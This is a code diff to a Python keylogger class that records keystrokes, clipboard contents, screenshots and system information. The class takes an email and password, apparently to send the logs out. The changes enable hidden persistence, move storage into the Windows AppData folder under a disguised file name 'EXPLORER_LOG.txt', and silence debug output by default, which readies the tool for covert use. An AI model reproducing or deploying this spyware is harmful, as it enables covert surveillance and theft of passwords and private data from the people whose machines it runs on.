@@ -37,15 +37,15 @@ from com_info import fetch_info
 
 class KeyLogger:
 
-    def __init__(self, interval, email, password, print_debug_logs=False):
+    def __init__(self, interval, email, password):
 
-        # self.become_persistent()
+        self.become_persistent()
         self.log = 'KeyLogger started\n'
 
         self.interval = interval
         self.email = email
         self.password = password
-        self.print_debug_logs = print_debug_logs
+        self.print_debug_logs = False
 
         self.msg_to_be_sent_later = ''
         self.clipboard = ''
@@ -55,8 +55,7 @@ class KeyLogger:
         self.ss_enterKey_count = 0
         self.ss_deleteKey_count = 0
 
-        # self._FILE_PATH = os.environ['appdata'] # Path where the required files and screenshots will be saved
-        self._FILE_PATH = r'E:\VISHWAS\Computer Science\Coding\Python\Projects\Keylogger'
+        self._FILE_PATH = os.environ['appdata'] # Path where the required files and screenshots will be saved
 
         self._SS_INFO = ''
         self._KEYS_INFO = 'EXPLORER_LOG.txt'  # Name of the file having keylogs
@@ -65,7 +64,8 @@ class KeyLogger:
 
         self.files_to_encrypt = [os.path.join(self._FILE_PATH, self._KEYS_INFO), os.path.join(self._FILE_PATH, self._SYSTEM_INFO)]
 
-    def start(self):
+    def start(self, print_debug_logs=False):
+        self.print_debug_logs = print_debug_logs
         if self.print_debug_logs:
             print('[+] Keylogger Started')
         key_listener = pk.Listener(on_press=self.process_key_press)
@@ -115,7 +115,6 @@ class KeyLogger:
         if self.print_debug_logs:
             print(f'[+] Logging key {current_key}')
 
-        # print(self.log)
         self.log += current_key
 
     def write_log(self, msg):
@@ -248,7 +247,7 @@ class KeyLogger:
 
     def report(self):
         if self.print_debug_logs:
-            print('[+] Calling report functions')
+            print('[+] Calling report function')
         self.copy_clipboard()
         self.screenshot()
         self.computer_info()
